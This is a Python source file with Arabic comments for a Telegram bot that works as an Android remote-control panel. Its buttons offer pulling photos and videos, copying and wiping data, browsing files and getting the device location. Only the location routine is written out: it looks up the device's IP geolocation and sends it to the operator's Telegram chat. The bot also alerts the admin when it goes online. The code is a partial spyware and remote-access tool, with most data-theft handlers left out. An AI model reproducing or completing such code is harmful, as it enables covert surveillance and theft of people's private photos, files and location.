import os
import shutil
import random
import threading
import time
import requests
import hashlib
from telebot import TeleBot, types
from colorama import Fore, Style, init
from dotenv import load_dotenv

# تحميل المتغيرات من ملف .env أو من إعدادات السيرفر
load_dotenv()
TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = os.getenv('ADMIN_ID')

# التأكد من وجود البيانات الأساسية
if not TOKEN or not ADMIN_ID:
    print(f"{Fore.RED}خطأ: لم يتم العثور على BOT_TOKEN أو ADMIN_ID في إعدادات البيئة!{Style.RESET_ALL}")
    exit()

ADMIN_ID = int(ADMIN_ID)
bot = TeleBot(TOKEN)
init()

# --- دالات المساعدة ---
def count_photos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.jpg', '.png', '.jpeg')):
                count += 1
    return count

def count_videos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.mp4', '.avi', '.mkv')):
                count += 1
    return count

def hash_path(path):
    return hashlib.sha256(path.encode()).hexdigest()[:16]

def find_path_by_hash(path_hash):
    root_directory = '/storage/emulated/0/' # ملاحظة: هذا المسار يعمل على أندرويد فقط
    for root, dirs, files in os.walk(root_directory):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if hash_path(item_path) == path_hash:
                return item_path
    return None

# --- معالجات الرسائل (Handlers) ---
@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = "مرحبًا! تم تفعيل لوحة التحكم عن بعد.\nمطور البوت🤖 @abdm39"
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton('سحب الصور 📸', callback_data='extract_photos'),
                 types.InlineKeyboardButton('سحب الفيديو 🎥', callback_data='search_videos'))
    keyboard.add(types.InlineKeyboardButton('تنظيف البيانات 🗑️', callback_data='clear_data'),
                 types.InlineKeyboardButton('نسخة من البيانات 📂', callback_data='copy_data'))
    keyboard.add(types.InlineKeyboardButton('الموقع 🌍', callback_data='location'),
                 types.InlineKeyboardButton('الملفات 📁', callback_data='files'))
    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'location')
def handle_location(call):
    try:
        ip_info = requests.get('http://ip-api.com/json/').json()
        if ip_info['status'] == 'success':
            latitude, longitude = ip_info['lat'], ip_info['lon']
            info = f"🌍 الموقع التقريبي:\nالدولة: {ip_info['country']}\nالمدينة: {ip_info['city']}\nIP: {ip_info['query']}"
            bot.send_location(call.message.chat.id, latitude, longitude)
            bot.send_message(call.message.chat.id, info)
    except:
        bot.send_message(call.message.chat.id, "فشل في تحديد الموقع.")

# (بقية الدوال المنطقية التي في ملفك الأصلي تبقى كما هي مع التأكد من المسارات)
# تم اختصار الكود هنا للتوضيح، لكن تأكد من نقل بقية الـ callback_handlers من ملفك

def notify_admin():
    try:
        bot.send_message(ADMIN_ID, "✅ البوت متصل الآن بنجاح.\nاضغط /start للتحكم.")
    except Exception as e:
        print(f"فشل إرسال الإشعار للآدمن: {e}")

if __name__ == '__main__':
    print(f"{Fore.GREEN}البوت يعمل الآن...{Style.RESET_ALL}")
    notify_admin()
    bot.infinity_polling()
